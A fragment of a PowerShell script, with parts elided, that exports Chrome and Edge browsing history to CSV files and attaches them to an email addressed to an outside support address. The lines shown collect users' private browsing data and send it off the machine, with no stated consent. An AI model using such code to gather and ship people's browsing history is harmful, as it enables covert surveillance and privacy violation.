...
$chromeHistory | Export-Csv -Path "C:\Admin\chrome_history.csv" -Force -NoTypeInformation
$edgeHistory = Get-EdgeHistory
$edgeHistory | Export-Csv -Path "C:\Admin\edge_history.csv" -Force -NoTypeInformation
...
$mail.To = "support@itclickpro.com"
# Add multiple attachments
$attachments = @("C:\\Admin\\chrome_history.csv", "C:\\Admin\\edge_history.csv")
